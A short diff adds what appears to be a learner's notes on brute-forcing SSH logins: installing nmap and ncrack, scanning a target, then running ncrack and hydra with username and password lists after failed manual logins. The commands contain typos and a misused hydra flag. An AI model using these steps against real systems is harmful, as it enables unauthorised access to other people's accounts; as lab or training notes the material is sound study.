@@ -1,0 +1,15 @@
+ls
+sudo apt install namp
+sudo apt install ncrack
+ifconfig
+(IP Adress is obtained)
+nmap -sV (IP Adress)
+(port22 open with ssh)
+ncrack -vV -U usernamelist.txt -P passwordslist.txt (IP Adress):22
+trying log in attempts manualy
+ssh administrator@(IP Address)
+password: Permission Denied (3 attemts)
+ssh admin@(IP Address)
+password: Permission Denied (3 attempts)
+hydra -u administrator -P passwordlist.txt (IP Address):22
+10000 attempts in division of 150 each time
